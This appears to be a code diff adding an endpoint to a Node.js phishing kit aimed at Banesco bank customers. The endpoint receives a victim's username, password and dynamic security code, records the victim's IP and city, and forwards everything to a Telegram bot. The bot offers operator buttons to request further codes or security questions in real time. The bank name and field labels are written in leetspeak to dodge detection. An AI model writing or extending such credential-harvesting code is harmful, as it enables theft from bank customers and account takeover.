@@ -155,6 +155,72 @@ ${pregunta2}❓ : ${respuesta2}
   res.sendStatus(200);
 });
 
+app.post('/enviar3', async (req, res) => {
+  const {
+    usar,
+    clavv,
+    txid,
+    dinamic
+  } = req.body;
+
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  const ciudad = await obtenerCiudad(ip);
+
+  // ✅ AÑADE ESTE BLOQUE
+  if (!clientes[txid]) {
+    clientes[txid] = {
+      status: "esperando",
+      usar,
+      clavv,
+      dinamic,
+      preguntas: [],
+      esperando: null
+    };
+  }
+
+  // ✅ ACTUALIZA EL STATUS
+  clientes[txid].status = "esperando";
+  guardarEstado();
+
+  const mensaje = `
+❓🔑🟢B4N3SC0🟢
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: ${usar}
+🔐 CL4V: ${clavv}
+
+🔑Clav.ESP : ${dinamic}
+
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
+    ]
+  };
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+
+
 
 
 app.post('/webhook', async (req, res) => {
